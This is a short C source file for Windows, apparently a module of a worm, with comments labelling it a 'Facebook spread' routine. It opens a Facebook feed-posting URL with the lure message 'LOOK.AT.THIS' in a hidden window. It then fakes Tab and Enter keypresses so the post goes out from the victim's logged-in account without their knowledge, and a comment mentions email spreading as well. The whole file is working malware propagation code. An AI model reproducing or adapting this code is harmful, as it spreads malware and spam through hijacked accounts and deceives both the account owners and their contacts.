//Facebook spread.
//Usage: fSpread();
#include "wALL.h"
#include "defines.h"
//Stuck the email spreading here to. :]
void key_type(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}

void fSpread(){
	char fMsg[512];
	char* fMsgTemp = "LOOK.AT.THIS";
	sprintf(fMsg, "http://www.facebook.com/connect/prompt_feed.php?&message=%s", fMsgTemp);
ShellExecute(NULL, "open", fMsg, NULL, NULL, SW_HIDE);


if (FindWindow(NULL,TEXT("Facebook"))) { //We're logged in or it would return Facebook | Login
keybd_event(VK_TAB,0x8f,0 , 0); // Tab Press
keybd_event(VK_TAB,0x8f, KEYEVENTF_KEYUP,0); // Tab Release
keybd_event(VK_RETURN,0x8f,0 , 0); // Enter Press
keybd_event(VK_RETURN,0x8f, KEYEVENTF_KEYUP,0); // Enter Release
} else {
keybd_event(VK_TAB,0x8f,0 , 0); // Tab Press
keybd_event(VK_TAB,0x8f, KEYEVENTF_KEYUP,0); // Tab Release
keybd_event(VK_TAB,0x8f,0 , 0); // Tab Press
keybd_event(VK_TAB,0x8f, KEYEVENTF_KEYUP,0); // Tab Release
		keybd_event(VK_RETURN, 0, 0, 0);

	}
}
